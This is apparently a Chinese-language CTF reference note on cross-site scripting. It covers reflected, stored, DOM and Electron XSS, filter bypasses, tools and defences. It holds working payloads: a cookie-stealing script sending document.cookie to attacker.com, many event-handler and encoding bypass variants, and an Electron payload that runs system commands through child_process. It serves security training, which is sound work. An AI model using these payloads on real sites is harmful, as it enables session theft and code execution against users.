# XSS (跨站脚本攻击)

## 概述

跨站脚本攻击（Cross-Site Scripting，XSS）允许攻击者在受害者的浏览器中执行恶意 JavaScript 代码。CTF 中的 XSS 题目主要考察反射型 XSS、存储型 XSS、DOM XSS、WAF 绕过以及在 Electron 应用中的 XSS。XSS 的最终目标通常是窃取 Cookie、读取页面内容或模拟用户操作。

## 常见攻击手法

### 1. 反射型 XSS

- **原理**：恶意脚本嵌入 URL 参数中，服务端将其直接返回给用户浏览器执行
- **检测**：在输入框中插入 `<script>alert(1)</script>` 或 `<img src=x onerror=alert(1)>`
- **利用场景**：
  - 窃取 Cookie：`<script>document.location='http://attacker.com/?c='+document.cookie</script>`
  - 页面钓鱼：伪造登录框
  - 配合 CSRF 执行敏感操作

### 2. 存储型 XSS

- **原理**：恶意脚本存储在服务器（数据库、文件、评论系统），当其他用户访问该页面时自动执行
- **危害更大**：无需欺骗用户点击特定链接，成为"持久化"攻击
- **典型场景**：评论区、留言板、用户资料、个人签名等
- **利用方式**：同反射型 XSS，但影响面更广

### 3. DOM XSS

- **原理**：恶意脚本通过修改页面 DOM 环境触发，攻击 payload 不经过服务器
- **常见 Sink**：
  - `innerHTML`、`outerHTML`、`insertAdjacentHTML`
  - `document.write()`、`document.writeln()`
  - `eval()`、`setTimeout()`、`setInterval()`、`new Function()`
  - `location`、`location.href`、`location.hash`
  - `onload`、`onerror`、`onclick` 等事件处理器

- **检测方法**：
  - 在 URL 中插入 `#<script>alert(1)</script>` 或 `?x=<img src=x onerror=alert(1)>`
  - 使用 Chrome DevTools 的 Sources 面板跟踪数据流

### 4. WAF 绕过 XSS

- **标签黑名单绕过**：
  - `<script>` 被过滤时尝试：`<img src=x onerror=alert(1)>`、`<svg onload=alert(1)>`、`<body onload=alert(1)>`、`<details open ontoggle=alert(1)>`
  - `<iframe srcdoc="<script>alert(1)</script>">`
- **事件处理器替换**：
  - `onerror` → `onload` → `onfocus` → `onmouseover` → `onclick`
  - 利用 autofocus：`<input autofocus onfocus=alert(1)>`
- **编码绕过**：
  - 十进制/十六进制 HTML 实体：`&#60;&#115;&#99;&#114;&#105;&#112;&#116;`
  - URL 编码、双重 URL 编码
  - Unicode 编码
- **空格/换行绕过**：`<img/src=x/onerror=alert(1)>`（使用 `/` 替代空格）
- **协议绕过**：`javascript:alert(1)` → `java%0ascr%0aipt:alert(1)`
- **长度限制绕过**：
  - 使用短域名缩短 payload
  - `#` 定位符与短 payload 组合
  - 分段加载：从外部 JS 文件加载后续 payload

### 5. Electron 中的 XSS

Electron 应用将 Web 技术与原生能力结合，XSS 攻击面更大。

- **Node 集成**：若 `nodeIntegration` 开启（默认 false），XSS 可直接执行系统命令：
  ```html
  <img src=x onerror="require('child_process').exec('calc')">
  ```
- **contextIsolation 绕过**：当 `contextIsolation` 为 false 时，攻击者可访问 `require` 函数
- **preload 脚本泄露**：preload 脚本中暴露的 `contextBridge` API 可能被 XSS 利用
- **Shell.openExternal**：通过 `shell.openExternal('file:///C:/Windows/System32/calc.exe')` 打开恶意文件
- **IPC 通信**：通过 `ipcRenderer` 向主进程发送恶意消息

### 6. XSS 绕过技巧汇总

- **HTML 实体编码**：`&lt;script&gt;` 仅在 HTML 标签内部不被解析，在标签之外会被解码执行
- **利用字符集**：UTF-7 编码（`+ADw-script+AD4-alert(1)+ADw-/script+AD4-`）
- **CSS 注入**：在某些场景下可利用 CSS 表达式（IE 特有）触发 JS
- **Mutation XSS (mXSS)**：利用浏览器的 DOM 变异修复机制绕过 HTML 过滤器

## 相关工具

| 工具 | 用途 |
|------|------|
| BeEF | XSS 利用框架，管理被攻陷的浏览器 |
| XSS Hunter | XSS 盲打平台，自动接收回调 |
| Burp Suite | 拦截修改请求，测试点检测 |
| PwnFox | XSS 利用辅助浏览器插件 |

## 防御建议

- 对用户输入进行 HTML 实体编码（`htmlspecialchars`、`encodeURIComponent`）
- 设置 HTTPOnly Cookie 防止 JS 读取 Cookie
- 实施 Content Security Policy（CSP）限制脚本来源
- 使用 DOMPurify 等库对富文本内容进行过滤

## CTF 中的常见考点

- 构造 payload 窃取管理员 Cookie（配合 Bot 访问）
- DOM XSS 分析前端 JS 找到注入点
- CSP 绕过（利用 CDN、JSONP 接口等）
- Electron 中开启 nodeIntegration 的 XSS 利用

## 相关技能

- [CSRF](CSRF.md)
- [认证绕过](认证绕过.md)
- [JS](JS.md)
- [PHP](PHP.md)
- [文件上传](文件上传.md)
- [WEB流量分析](../安全杂项/WEB流量分析.md)
